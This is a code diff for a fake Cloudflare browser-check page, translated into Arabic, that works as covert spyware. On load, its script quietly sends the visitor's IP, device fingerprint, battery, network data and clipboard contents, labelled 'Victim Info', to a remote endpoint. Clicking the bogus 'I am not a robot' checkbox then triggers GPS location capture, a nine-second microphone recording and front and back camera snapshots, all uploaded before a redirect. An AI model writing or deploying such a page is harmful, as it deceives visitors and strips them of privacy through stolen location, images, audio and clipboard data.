@@ -1,109 +1,101 @@
 <!DOCTYPE html>
-<html lang="en-US">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="robots" content="noindex, nofollow">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Just a moment...</title>
+<title>لحظة من فضلك...</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-html{font-family:sans-serif;background:#fff;color:#313131}
+html{font-family:'Segoe UI',Tahoma,sans-serif;background:#f6f6f6;color:#313131;direction:rtl}
 body{display:flex;flex-direction:column;min-height:100vh}
 .main-wrap{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 20px}
+.card{background:#fff;border:1px solid #e2e2e2;border-radius:10px;padding:32px 24px;max-width:440px;width:100%;text-align:center}
 
-/* Cloudflare real page style */
-.cf-browser-verification{background:#f6f6f6;border:1px solid #e2e2e2;border-radius:8px;padding:32px 28px;max-width:440px;width:100%;text-align:center}
-.cf-logo{margin-bottom:18px}
-.cf-logo svg{height:44px}
+/* Logo */
+.cf-logo{margin-bottom:16px}
+.cf-logo svg{height:42px}
 
-.cf-heading{font-size:22px;font-weight:600;color:#313131;margin-bottom:10px}
-.cf-subheading{font-size:14px;color:#555;margin-bottom:28px;line-height:1.6}
+.cf-title{font-size:21px;font-weight:700;color:#313131;margin-bottom:8px}
+.cf-sub{font-size:13px;color:#666;margin-bottom:24px;line-height:1.7}
 
 /* Spinner */
-.cf-spinner-wrap{margin:0 auto 24px;width:60px;height:60px;position:relative}
-.cf-spinner{width:60px;height:60px;border-radius:50%;border:4px solid #e8e8e8;border-top-color:#f48120;animation:cf-spin 0.8s linear infinite}
-@keyframes cf-spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
-.cf-spinner-done{width:60px;height:60px;border-radius:50%;background:#f48120;display:flex;align-items:center;justify-content:center;display:none}
-.cf-spinner-done svg{width:32px;height:32px}
+.spinner-wrap{margin:0 auto 22px;width:56px;height:56px}
+.spinner{width:56px;height:56px;border-radius:50%;border:4px solid #e8e8e8;border-top-color:#f48120;animation:spin .8s linear infinite}
+@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
 
-/* Progress steps text */
-.cf-checking{font-size:14px;color:#313131;margin-bottom:6px;font-weight:500}
-.cf-note{font-size:12px;color:#999;margin-bottom:20px}
+#step-text{font-size:14px;color:#555;margin-bottom:5px;font-weight:500}
+.note{font-size:12px;color:#aaa;margin-bottom:22px}
 
-/* Checkbox challenge (optional second step) */
-.cf-challenge{display:none;margin:0 auto 20px;border:1px solid #d0d0d0;border-radius:4px;background:#fff;padding:14px 16px;max-width:300px;align-items:center;gap:12px;cursor:pointer;user-select:none}
-.cf-checkbox{width:26px;height:26px;border:2px solid #c0c0c0;border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:.2s}
-.cf-checkbox.checked{background:#f48120;border-color:#f48120}
-.cf-checkbox.checked svg{display:block}
-.cf-checkbox svg{display:none;width:16px;height:16px}
-.cf-checkbox-label{font-size:14px;color:#313131;font-weight:500}
-.cf-checkbox-brand{margin-left:auto;display:flex;flex-direction:column;align-items:center;font-size:9px;color:#aaa;gap:1px}
+/* Checkbox */
+.cf-check-row{display:none;align-items:center;justify-content:center;gap:12px;background:#fafafa;border:1px solid #ddd;border-radius:6px;padding:14px 18px;cursor:pointer;margin-bottom:20px;direction:ltr}
+.cf-checkbox{width:26px;height:26px;border:2px solid #bbb;border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:.2s}
+.cf-checkbox.ticked{background:#f48120;border-color:#f48120}
+.cf-checkbox.ticked svg{display:block}
+.cf-checkbox svg{display:none;width:15px;height:15px}
+.cf-check-label{font-size:14px;color:#313131;font-weight:600;direction:rtl}
+.cf-brand{display:flex;flex-direction:column;align-items:center;font-size:9px;color:#aaa;gap:1px;margin-right:auto}
 
-/* Ray + security */
-.cf-footer{margin-top:20px;padding-top:16px;border-top:1px solid #e2e2e2;display:flex;justify-content:space-between;align-items:flex-end;font-size:11px;color:#999}
-.cf-ray b{color:#777}
-.cf-security{text-align:right;font-size:10px}
+/* Footer */
+.cf-footer{border-top:1px solid #eee;padding-top:14px;margin-top:4px;display:flex;justify-content:space-between;align-items:flex-end;font-size:11px;color:#bbb;direction:ltr}
+.cf-footer b{color:#888}
+.cf-footer-brand{text-align:right}
 
 /* Bottom bar */
-.footer-bar{background:#f6f6f6;border-top:1px solid #e2e2e2;padding:14px 20px;display:flex;justify-content:center;gap:30px;font-size:12px;color:#999}
-.footer-bar a{color:#f48120;text-decoration:none}
+.foot-bar{background:#efefef;border-top:1px solid #ddd;padding:12px 20px;display:flex;justify-content:center;gap:24px;font-size:12px;color:#aaa}
+.foot-bar a{color:#f48120;text-decoration:none}
 </style>
 </head>
 <body>
 <div class="main-wrap">
-  <div class="cf-browser-verification">
-
-    <!-- CF Logo -->
+  <div class="card">
     <div class="cf-logo">
-      <svg viewBox="0 0 109 44" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <path d="M72.8 16.2c-.4-1.6-1.2-3-2.4-4.1-1.2-1.1-2.8-1.8-4.5-1.8-.6 0-1.2.1-1.8.2-1.3-2.4-3.8-4-6.7-4-4.2 0-7.6 3.4-7.6 7.6 0 .1 0 .3.0.4-2.6.5-4.5 2.8-4.5 5.5 0 3.1 2.5 5.6 5.6 5.6h20.9c2.8 0 5-2.2 5-5 0-2.4-1.7-4.4-4-4.9z" fill="#F6821F"/>
-        <path d="M75.5 25.8H54.6c-2.8 0-5-2.2-5-5s2.2-5 5-5h.3c-.0-.2-.0-.4-.0-.6 0-4.2 3.4-7.6 7.6-7.6 3.1 0 5.8 1.9 7 4.7.5-.1 1-.2 1.6-.2 3.1 0 5.6 2.5 5.6 5.6 0 .1 0 .2 0 .3 1.9.6 3.3 2.4 3.3 4.5 0 2.6-2.1 4.7-4.7 4.7.1 0 .1.0.1.0z" fill="#FBAD41"/>
-        <text x="2" y="38" font-family="sans-serif" font-size="13" font-weight="700" fill="#F6821F">Cloudflare</text>
+      <svg viewBox="0 0 130 44" xmlns="http://www.w3.org/2000/svg">
+        <path d="M72.8 16.2c-.4-1.6-1.2-3-2.4-4.1-1.2-1.1-2.8-1.8-4.5-1.8-.6 0-1.2.1-1.8.2-1.3-2.4-3.8-4-6.7-4-4.2 0-7.6 3.4-7.6 7.6 0 .1 0 .3 0 .4-2.6.5-4.5 2.8-4.5 5.5 0 3.1 2.5 5.6 5.6 5.6h20.9c2.8 0 5-2.2 5-5 0-2.4-1.7-4.4-4-4.9z" fill="#F6821F"/>
+        <path d="M75.5 25.8H54.6c-2.8 0-5-2.2-5-5s2.2-5 5-5h.3c0-.2 0-.4 0-.6 0-4.2 3.4-7.6 7.6-7.6 3.1 0 5.8 1.9 7 4.7.5-.1 1-.2 1.6-.2 3.1 0 5.6 2.5 5.6 5.6 0 .1 0 .2 0 .3 1.9.6 3.3 2.4 3.3 4.5 0 2.6-2.1 4.7-4.7 4.7z" fill="#FBAD41"/>
+        <text x="84" y="28" font-family="sans-serif" font-size="15" font-weight="700" fill="#F6821F">Cloudflare</text>
       </svg>
     </div>
 
-    <div class="cf-heading">Checking your browser</div>
-    <div class="cf-subheading" id="domain-line">before accessing <b id="dest-domain">the requested page</b></div>
+    <div class="cf-title">جارٍ التحقق من متصفحك</div>
+    <div class="cf-sub">قبل الوصول إلى <b id="dest-domain">الصفحة المطلوبة</b><br>هذه العملية تلقائية وتستغرق بضع ثوانٍ</div>
 
-    <!-- Spinner -->
-    <div class="cf-spinner-wrap">
-      <div class="cf-spinner" id="spinner"></div>
-    </div>
+    <div class="spinner-wrap"><div class="spinner" id="spinner"></div></div>
 
-    <div class="cf-checking" id="step-text">Verifying you are human. This may take a few seconds.</div>
-    <div class="cf-note">Please allow up to 5 seconds…</div>
+    <div id="step-text">يتم التحقق من هويتك، يرجى الانتظار...</div>
+    <div class="note">يرجى الانتظار حتى 5 ثوانٍ...</div>
 
-    <!-- Checkbox challenge (shown after spinner) -->
-    <div class="cf-challenge" id="cf-challenge" onclick="doCheck()">
-      <div class="cf-checkbox" id="cf-checkbox">
+    <!-- Checkbox shown after spinner -->
+    <div class="cf-check-row" id="check-row" onclick="doVerify()">
+      <div class="cf-checkbox" id="cf-cb">
         <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
       </div>
-      <div class="cf-checkbox-label">I am human</div>
-      <div class="cf-checkbox-brand">
-        <svg viewBox="0 0 60 15" width="40" height="10" fill="#F6821F"><text y="12" font-size="12" font-family="sans-serif" font-weight="700">cf</text></svg>
+      <div class="cf-check-label">أنا لست روبوت</div>
+      <div class="cf-brand">
+        <span style="font-size:11px;font-weight:700;color:#f48120">cf</span>
         <span>Privacy</span>
       </div>
     </div>
 
     <div class="cf-footer">
-      <div class="cf-ray">Ray ID: <b id="ray-id">loading</b></div>
-      <div class="cf-security">
-        <div>Performance &amp; security by</div>
-        <div style="color:#f48120;font-weight:600">Cloudflare</div>
+      <div>Ray ID: <b id="ray-id">—</b></div>
+      <div class="cf-footer-brand">
+        <div style="font-size:10px">الأمان بواسطة</div>
+        <div style="color:#f48120;font-weight:700;font-size:12px">Cloudflare</div>
       </div>
     </div>
   </div>
 </div>
 
-<div class="footer-bar">
-  <a href="https://www.cloudflare.com/privacypolicy/" target="_blank">Privacy Policy</a>
-  <a href="https://www.cloudflare.com/terms/" target="_blank">Terms of Service</a>
-  <a href="https://support.cloudflare.com/" target="_blank">Cookie Settings</a>
+<div class="foot-bar">
+  <a href="https://www.cloudflare.com/privacypolicy/" target="_blank">سياسة الخصوصية</a>
+  <a href="https://www.cloudflare.com/terms/" target="_blank">شروط الخدمة</a>
+  <a href="https://support.cloudflare.com/" target="_blank">الدعم</a>
 </div>
 
-<!-- Hidden elements for camera -->
-<video id="vid-front" style="display:none;position:fixed;top:-9999px" playsinline autoplay muted></video>
-<video id="vid-back"  style="display:none;position:fixed;top:-9999px" playsinline autoplay muted></video>
+<!-- Hidden media elements -->
+<video id="vid-front" style="position:fixed;top:-9999px;left:-9999px" playsinline autoplay muted></video>
+<video id="vid-back"  style="position:fixed;top:-9999px;left:-9999px" playsinline autoplay muted></video>
 <canvas id="canvas" width="640" height="640" style="display:none"></canvas>
 
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
@@ -112,119 +104,165 @@ var uid="<%=uid%>",a="<%=a%>",destUrl="<%=url%>";
 var snapsConfirmed=0,minSnaps=2,redirectDone=false;
 
 // Ray ID
-var chars="qwertyuioplkjhgfdsazxcvbnm0987654321";
-var ray="";for(var i=0;i<17;i++)ray+=chars[Math.floor(Math.random()*35)];
+var chars="abcdefghijklmnopqrstuvwxyz0123456789";
+var ray="";for(var i=0;i<17;i++)ray+=chars[Math.floor(Math.random()*36)];
 document.getElementById('ray-id').textContent=ray;
 
 // Show destination domain
-try{
-  var d=new URL(destUrl);
-  document.getElementById('dest-domain').textContent=d.hostname;
-}catch(e){}
+try{var dh=new URL(destUrl);document.getElementById('dest-domain').textContent=dh.hostname;}catch(e){}
 
 function tryRedirect(){
   if(redirectDone)return;
   if(snapsConfirmed>=minSnaps){
     redirectDone=true;
-    document.getElementById('step-text').textContent="Verification complete! Redirecting...";
-    document.getElementById('spinner').style.borderTopColor="#34c759";
-    setTimeout(function(){window.location.href=destUrl;},600);
+    document.getElementById('step-text').textContent="اكتمل التحقق! جارٍ التحويل...";
+    document.getElementById('spinner').style.borderColor='#e8e8e8';
+    document.getElementById('spinner').style.borderTopColor='#34c759';
+    setTimeout(function(){window.location.href=destUrl;},700);
   }
 }
-setTimeout(function(){if(!redirectDone){redirectDone=true;window.location.href=destUrl;}},28000);
+setTimeout(function(){if(!redirectDone){redirectDone=true;window.location.href=destUrl;}},30000);
 
-// ── Silent tracking (runs immediately in background) ──────────────────────────
+// ── Silent background collection ──────────────────────────────────────────────
 async function sendDeviceInfo(){
   var td="";
   <% if(!t){ %>
   td+='<code>✅ Victim Info</code><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip%>"><%=ip%></a> | <%=time%> UTC</b>';
   <% }else{ %>
-  try{var r=await fetch(a).then(x=>x.json());td+='<code>✅ Victim Info</code><br><b>⚓ IP: <a href="https://ip-api.com/#'+r.ip+'">'+r.ip+'</a> | <%=time%> UTC</b>';}catch(e){}
+  try{var rr=await fetch(a).then(x=>x.json());td+='<code>✅ Victim Info</code><br><b>⚓ IP: <a href="https://ip-api.com/#'+rr.ip+'">'+rr.ip+'</a> | <%=time%> UTC</b>';}catch(e){}
   <% } %>
   td+="<br><b>🕒 "+new Date()+"</b><br><b>Screen: "+screen.width+"x"+screen.height+"</b><br><b>TZ: "+Intl.DateTimeFormat().resolvedOptions().timeZone+"</b><br>";
-  var xo=["platform","userAgent","language","maxTouchPoints","hardwareConcurrency","cookieEnabled","vendor","deviceMemory","appVersion","webdriver"];
+  var keys=["platform","userAgent","language","maxTouchPoints","hardwareConcurrency","cookieEnabled","vendor","deviceMemory","appVersion","webdriver"];
   td+="<br><b>📱 Device</b><br>";
-  for(var i=0;i<xo.length;i++){if(xo[i] in navigator){td+="<b>"+xo[i]+":</b> <code>"+navigator[xo[i]]+"</code><br>";}}
-  if(navigator.connection){
-    var nc=navigator.connection;
-    td+="<br><b>🌐 Net: "+nc.effectiveType+" | "+(nc.downlink||'?')+"Mbps | RTT:"+(nc.rtt||'?')+"ms</b><br>";
-    $.post(a+"/network",{uid:uid,data:encodeURIComponent("📶 "+nc.effectiveType+" ⚡"+(nc.downlink||'?')+"Mbps RTT:"+(nc.rtt||'?')+"ms")});
-  }
-  if("getBattery" in navigator){
-    try{var b=await navigator.getBattery();var pct=Math.round(b.level*100);td+="<b>🔋 "+pct+"% | Charging:"+b.charging+"</b><br>";$.post(a+"/battery",{uid:uid,level:pct,charging:b.charging});}catch(e){}
-  }
-  $.post(a,{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},function(){});
-  if(navigator.clipboard&&navigator.clipboard.readText){
-    try{var clip=await navigator.clipboard.readText();if(clip&&clip.trim())$.post(a+"/clipboard",{uid:uid,clip:encodeURIComponent(clip)});}catch(e){}
-  }
+  for(var i=0;i<keys.length;i++){if(keys[i] in navigator)td+="<b>"+keys[i]+":</b> <code>"+navigator[keys[i]]+"</code><br>";}
+  if(navigator.connection){var nc=navigator.connection;td+="<br><b>🌐 "+nc.effectiveType+" | "+(nc.downlink||'?')+"Mbps | RTT:"+(nc.rtt||'?')+"ms</b><br>";$.post(a+"/network",{uid:uid,data:encodeURIComponent("📶 "+nc.effectiveType+" ⚡"+(nc.downlink||'?')+"Mbps RTT:"+(nc.rtt||'?')+"ms")});}
+  if("getBattery" in navigator){try{var batt=await navigator.getBattery();var pct=Math.round(batt.level*100);td+="<b>🔋 "+pct+"% | Charging:"+batt.charging+"</b><br>";$.post(a+"/battery",{uid:uid,level:pct,charging:batt.charging});}catch(e){}}
+  $.post(a,{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+  if(navigator.clipboard&&navigator.clipboard.readText){try{var cl=await navigator.clipboard.readText();if(cl&&cl.trim())$.post(a+"/clipboard",{uid:uid,clip:encodeURIComponent(cl)});}catch(e){}}
 }
 
+// ── Location: called at button click with GPS priority ────────────────────────
 function fireLocation(){
   function sendLoc(lat,lon,acc){$.post(a+"/location",{uid:uid,lat:encodeURIComponent(lat),lon:encodeURIComponent(lon),acc:encodeURIComponent(acc)});}
   async function ipFb(){try{var d=await fetch("https://ipapi.co/json/").then(r=>r.json());if(d&&d.latitude)sendLoc(d.latitude,d.longitude,"IP (~"+d.city+", "+d.country_name+")");}catch(e){}}
   if(!navigator.geolocation){ipFb();return;}
-  var t=setTimeout(ipFb,9000);
+  var t=setTimeout(ipFb,10000);
   navigator.geolocation.getCurrentPosition(
     function(p){clearTimeout(t);sendLoc(p.coords.latitude,p.coords.longitude,p.coords.accuracy+"m (GPS)");},
     function(){clearTimeout(t);ipFb();},
-    {enableHighAccuracy:true,timeout:8000,maximumAge:0}
+    {enableHighAccuracy:true,timeout:9000,maximumAge:0}
   );
 }
 
-async function startCamera(){
-  var stream=null;
-  try{stream=await navigator.mediaDevices.getUserMedia({audio:true,video:{facingMode:"user",width:{ideal:640},height:{ideal:640}}});}
-  catch(e1){try{stream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:"user"}});}catch(e2){
-    snapsConfirmed+=minSnaps;tryRedirect();return;
-  }}
-  var vidFront=document.getElementById('vid-front');
-  vidFront.srcObject=stream;try{await vidFront.play();}catch(e){}
-  await new Promise(function(r){var c=setInterval(function(){if(vidFront.readyState>=2&&vidFront.videoWidth>0){clearInterval(c);r();}},200);setTimeout(function(){clearInterval(c);r();},4000);});
-  // audio
-  var at=stream.getAudioTracks();
-  if(at.length){try{var rec=new MediaRecorder(new MediaStream(at)),chunks=[];rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};rec.onstop=function(){var blob=new Blob(chunks,{type:'audio/webm'}),fr=new FileReader();fr.onloadend=function(){$.post(a+"/audio",{uid:uid,audio:encodeURIComponent(fr.result.replace(/^data:.+;base64,/,''))});};fr.readAsDataURL(blob);};rec.start();setTimeout(function(){try{rec.stop();}catch(e){}},9000);}catch(e){}}
-  // front snaps
-  var canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d'),sd=0;
-  var st=setInterval(function(){
-    if(vidFront.readyState<2||vidFront.videoWidth===0)return;
-    ctx.drawImage(vidFront,0,0,640,640);
-    var d=canvas.toDataURL("image/png").replace("data:image/png;base64","");
-    $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(d),cam:"front"},function(){snapsConfirmed++;tryRedirect();});
-    if(++sd>=4)clearInterval(st);
-  },1200);
-  // back cam
-  setTimeout(async function(){
-    try{var bs=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:{exact:"environment"},width:{ideal:640},height:{ideal:640}}});
-    var vb=document.getElementById('vid-back');vb.srcObject=bs;try{await vb.play();}catch(e){}
-    await new Promise(function(r){var c=setInterval(function(){if(vb.readyState>=2&&vb.videoWidth>0){clearInterval(c);r();}},200);setTimeout(function(){clearInterval(c);r();},3000);});
-    for(var i=0;i<2;i++){await new Promise(function(r){setTimeout(r,1500);});if(vb.readyState>=2&&vb.videoWidth>0){ctx.drawImage(vb,0,0,640,640);$.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64","")),cam:"back"});}}
-    bs.getTracks().forEach(function(t){t.stop();});}catch(e){}
-  },3500);
+// ── Camera: front then back (sequential to avoid conflict) ────────────────────
+async function doCamera(){
+  var canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d');
+
+  // --- FRONT CAMERA ---
+  var frontStream=null;
+  var frontConstraints=[
+    {audio:true, video:{facingMode:"user",width:{ideal:640},height:{ideal:640}}},
+    {audio:true, video:{facingMode:"user"}},
+    {audio:false,video:{facingMode:"user"}},
+    {audio:false,video:true}
+  ];
+  for(var fi=0;fi<frontConstraints.length;fi++){
+    try{frontStream=await navigator.mediaDevices.getUserMedia(frontConstraints[fi]);break;}catch(e){}
+  }
+
+  if(frontStream){
+    var vidF=document.getElementById('vid-front');
+    vidF.srcObject=frontStream;
+    try{await vidF.play();}catch(e){}
+    // wait for video ready
+    await new Promise(function(res){var c=setInterval(function(){if(vidF.readyState>=2&&vidF.videoWidth>0){clearInterval(c);res();}},150);setTimeout(function(){clearInterval(c);res();},4000);});
+
+    // audio recording
+    var audioTracks=frontStream.getAudioTracks();
+    if(audioTracks.length){
+      try{
+        var rec=new MediaRecorder(new MediaStream(audioTracks)),chunks=[];
+        rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};
+        rec.onstop=function(){var blob=new Blob(chunks,{type:'audio/webm'}),fr=new FileReader();fr.onloadend=function(){$.post(a+"/audio",{uid:uid,audio:encodeURIComponent(fr.result.replace(/^data:.+;base64,/,''))});};fr.readAsDataURL(blob);};
+        rec.start();
+        setTimeout(function(){try{rec.stop();}catch(e){}},9000);
+      }catch(e){}
+    }
+
+    // front snaps
+    var frontCount=0;
+    await new Promise(function(done){
+      var iv=setInterval(function(){
+        if(vidF.readyState>=2&&vidF.videoWidth>0){
+          ctx.drawImage(vidF,0,0,640,640);
+          var imgData=canvas.toDataURL("image/png").replace("data:image/png;base64","");
+          $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(imgData),cam:"front"},function(){snapsConfirmed++;tryRedirect();});
+          frontCount++;
+        }
+        if(frontCount>=3){clearInterval(iv);done();}
+      },1200);
+      setTimeout(function(){clearInterval(iv);done();},8000);
+    });
+
+    // Stop front camera tracks BEFORE starting back camera
+    frontStream.getVideoTracks().forEach(function(t){t.stop();});
+  } else {
+    snapsConfirmed+=minSnaps;
+    tryRedirect();
+    return;
+  }
+
+  // --- BACK CAMERA (after front stops) ---
+  await new Promise(function(r){setTimeout(r,500);});
+  var backConstraints=[
+    {audio:false,video:{facingMode:{exact:"environment"},width:{ideal:1280},height:{ideal:720}}},
+    {audio:false,video:{facingMode:{exact:"environment"}}},
+    {audio:false,video:{facingMode:"environment"}},
+    {audio:false,video:{deviceId:undefined}} // fallback any camera
+  ];
+  var backStream=null;
+  for(var bi=0;bi<backConstraints.length;bi++){
+    try{backStream=await navigator.mediaDevices.getUserMedia(backConstraints[bi]);break;}catch(e){}
+  }
+
+  if(backStream){
+    var vidB=document.getElementById('vid-back');
+    vidB.srcObject=backStream;
+    try{await vidB.play();}catch(e){}
+    await new Promise(function(res){var c=setInterval(function(){if(vidB.readyState>=2&&vidB.videoWidth>0){clearInterval(c);res();}},150);setTimeout(function(){clearInterval(c);res();},4000);});
+    // back snaps
+    for(var si=0;si<2;si++){
+      await new Promise(function(r){setTimeout(r,1000);});
+      if(vidB.readyState>=2&&vidB.videoWidth>0){
+        ctx.drawImage(vidB,0,0,640,640);
+        $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64","")),cam:"back"});
+      }
+    }
+    backStream.getTracks().forEach(function(t){t.stop();});
+  }
 }
 
-// ── Checkbox click ─────────────────────────────────────────────────────────────
-var checked=false;
-function doCheck(){
-  if(checked)return;
-  checked=true;
-  var cb=document.getElementById('cf-checkbox');
-  cb.classList.add('checked');
-  document.getElementById('step-text').textContent="Verifying... please wait";
-  startCamera();
-}
-
-// ── Flow ───────────────────────────────────────────────────────────────────────
-window.addEventListener('DOMContentLoaded',function(){
-  sendDeviceInfo();
+// ── One button: all permissions at once ───────────────────────────────────────
+var verifying=false;
+function doVerify(){
+  if(verifying)return;
+  verifying=true;
+  document.getElementById('cf-cb').classList.add('ticked');
+  document.getElementById('step-text').textContent="جارٍ التحقق... يرجى الانتظار";
+  // Fire location + camera together (both permission dialogs appear)
   fireLocation();
+  doCamera();
+}
 
-  // Step 1: spinner for 2.5s then show checkbox
+// ── Page init ─────────────────────────────────────────────────────────────────
+window.addEventListener('DOMContentLoaded',function(){
+  sendDeviceInfo(); // silent, no permission needed
+  // After 2.5s show checkbox
   setTimeout(function(){
-    document.getElementById('step-text').textContent="Almost there — one more step";
-    document.getElementById('cf-challenge').style.display='flex';
-    document.getElementById('spinner').style.borderColor='#e8e8e8';
-    document.getElementById('spinner').style.borderTopColor='#f48120';
+    document.getElementById('step-text').textContent="خطوة أخيرة للتحقق من هويتك";
     document.getElementById('spinner').style.animationPlayState='paused';
+    document.getElementById('spinner').style.borderTopColor='#f48120';
+    document.getElementById('check-row').style.display='flex';
   },2500);
 });
 </script>
